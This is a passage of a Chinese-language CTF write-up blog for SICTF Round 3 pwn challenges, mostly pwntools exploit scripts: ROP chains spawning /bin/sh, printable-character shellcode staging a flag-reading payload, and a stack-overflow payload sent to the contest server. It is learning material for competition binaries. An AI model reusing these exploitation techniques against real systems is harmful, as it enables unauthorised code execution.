<span class="n">syscall</span>     <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="sh">'</span><span class="s">mov rdx, 0x1D; mov rax, 1; syscall</span><span class="sh">'</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">14</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x38</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rcx</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">mov_rdx_rcx</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x404E88</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>
<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x38</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x460000</span><span class="o">+</span><span class="mh">0x800</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">104</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x460000</span><span class="o">+</span><span class="mh">0x800</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rcx</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">mov_rdx_rcx</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>
<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="c1">#
</span><span class="nf">pause</span><span class="p">()</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#
</span>
<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218161445-wojxfei.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218161445-wojxfei.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h3 id="进阶bug_zapper_pro"><span class="me-2">(🩸)[进阶]Bug_Zapper_Pro+</span><a href="#进阶bug_zapper_pro" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./bugzapper_pro</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">);</span><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>


<span class="n">sc</span>  <span class="o">=</span><span class="sh">'''</span><span class="s">
push ebx
push ebx
push rax
</span><span class="sh">'''</span>
<span class="c1"># pwndbg&gt; si
# 0x0000000114514fe0 in ?? ()
# LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
# ──────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────
# RAX  0x114514fe0 ◂— nop  /* 0x9090909090909090 */
# RBX  0x0
# RCX  0x0
# RDX  0x0
# RDI  0x0
# RSI  0x0
# R8   0x0
# R9   0x0
# R10  0x0
# R11  0x0
# R12  0x0
# R13  0x0
# R14  0x0
# R15  0x0
# RBP  0x0
# *RSP  0x7ffdad853ee8 —▸ 0x4010fb (end) ◂— mov rdi, 1
# *RIP  0x114514fe0 ◂— nop  /* 0x9090909090909090 */
# ───────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────
# ► 0x114514fe0    nop  
# 0x114514fe1    nop  
# 0x114514fe2    nop  
# 0x114514fe3    nop  
# 0x114514fe4    nop  
# 0x114514fe5    nop  
# 0x114514fe6    nop  
# 0x114514fe7    nop  
# 0x114514fe8    nop  
# 0x114514fe9    nop  
# 0x114514fea    nop  
# ────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────
# 00:0000│ rsp 0x7ffdad853ee8 —▸ 0x4010fb (end) ◂— mov rdi, 1
# 01:0008│     0x7ffdad853ef0 ◂— 0x1
# 02:0010│     0x7ffdad853ef8 —▸ 0x7ffdad854386 ◂— './bugzapper_pro'
# 03:0018│     0x7ffdad853f00 ◂— 0x0
# 04:0020│     0x7ffdad853f08 —▸ 0x7ffdad854396 ◂— 'COLORTERM=truecolor'
# 05:0028│     0x7ffdad853f10 —▸ 0x7ffdad8543aa ◂— 'DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/0/bus'
# 06:0030│     0x7ffdad853f18 —▸ 0x7ffdad8543dd ◂— 'DESKTOP_SESSION=ubuntu'
# 07:0038│     0x7ffdad853f20 —▸ 0x7ffdad8543f4 ◂— 'DISPLAY=:0'
# ──────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────
# ► 0      0x114514fe0
# 1         0x4010fb end
# 2              0x1
# 3   0x7ffdad854386
# 4              0x0
</span>


<span class="c1">#io = remote('yuanshen.life',36747)
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">'</span><span class="s">./bugzapper_pro</span><span class="sh">'</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;&gt; </span><span class="sh">'</span><span class="p">)</span>

<span class="c1">#context.arch      = 'i386'
#sc = '''
#sub    al, 0x36
#'''
## '0x5e4a3c'
## &gt;&gt;&gt; hex(0x514faa ^ 0x0f0596)
##bd = b'\x31\x42\x6b'
#bd = b'\x31\x40\x3e' # eax
##bd = b'\x31\x70\x6b' # esi
##bd = b'\x31\x30'
#sc = asm(sc) + bd
#sc += asm('''
#pop edx
#push eax
#pop esi
#''')
##sc += b'\x5e\x4a\x3c'
#sc += b'\x54\x40\x39'[::-1]
</span><span class="n">sc</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="sh">'</span><span class="s">2c 36 31 40  3e 5a 50 5e  39 40 54</span><span class="sh">'</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">,</span><span class="sh">''</span><span class="p">))</span>
<span class="nf">print</span><span class="p">(</span><span class="nf">disasm</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>
<span class="nf">print</span><span class="p">(</span><span class="nf">hexdump</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>
<span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="sh">'</span><span class="s">b *0x401098</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">s</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>

<span class="nf">pause</span><span class="p">()</span>
<span class="c1">#
</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">sc</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
mov rsi, 0x114514000
xor rax,rax
xor rdi,rdi
syscall
jmp rsi
</span><span class="sh">'''</span>
<span class="n">pay</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">sc</span><span class="p">).</span><span class="nf">rjust</span><span class="p">(</span><span class="mh">0x4a</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="c1">#
</span><span class="nf">pause</span><span class="p">()</span>
<span class="n">pay</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">flag</span><span class="sh">'</span><span class="p">))</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">sendfile</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">rax</span><span class="sh">'</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x50</span><span class="p">))</span>
<span class="c1">#pay = asm(shellcraft.sh())
</span><span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>


</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<blockquote>
  <p>只能使用 可见字符</p>
</blockquote>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240217164905-29ebcli.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240217164905-29ebcli.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240217164945-at01fn1.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240217164945-at01fn1.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240217164955-b5mo309.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240217164955-b5mo309.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240217165101-pc6f53z.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240217165101-pc6f53z.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h3 id="overflow"><span class="me-2">(🩸)overflow</span><a href="#overflow" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./overflow</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">);</span><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
b *0x401442
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">yuanshen.life</span><span class="sh">'</span><span class="p">,</span><span class="mi">36365</span><span class="p">)</span>

<span class="c1">#gdb.attach(io,'b *0x40132c')
#pay =  + p64(0x401372) * 0x30
#pay =  b'1111111122222222' +p64(0x401056) +p64(0x04011D0)+p64(0x401076)+(88-0x28) * b'A' +p64(0x401372)+ p64(0x404000) * 0x10
#pay =  b'1111111122222222' +b'B'*8 +p64(0x04011D0)+p64(0x401076)+(88-0x28) * b'A' +p64(0x401372)+ p64(0x404000) * 0x10
</span>

<span class="n">pay</span> <span class="o">=</span>  <span class="nf">p64</span><span class="p">(</span><span class="mh">0x04011D0</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x401076</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="mi">88</span><span class="o">-</span><span class="mh">0x28</span><span class="p">)</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x401372</span><span class="p">)</span><span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x404000</span><span class="o">+</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x10</span>
<span class="c1">#pay =  p64(0x04011D0)+p64(0x401076)+(88-0x28) * b'A' +p64(0x401372)+ p64(0x404000+0x10) * 0x10
</span><span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h3 id="eeeeasy_cpp"><span class="me-2">(🩸)Eeeeasy_Cpp</span><a href="#eeeeasy_cpp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<blockquote>
  <p>本来几分钟就可以打下来的，奈何没有第一时间看到 backdoor 这个后门函数，</p>

  <p>导致后面 本地环境可getshell ，远程死活不行，搞半年。</p>
</blockquote>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
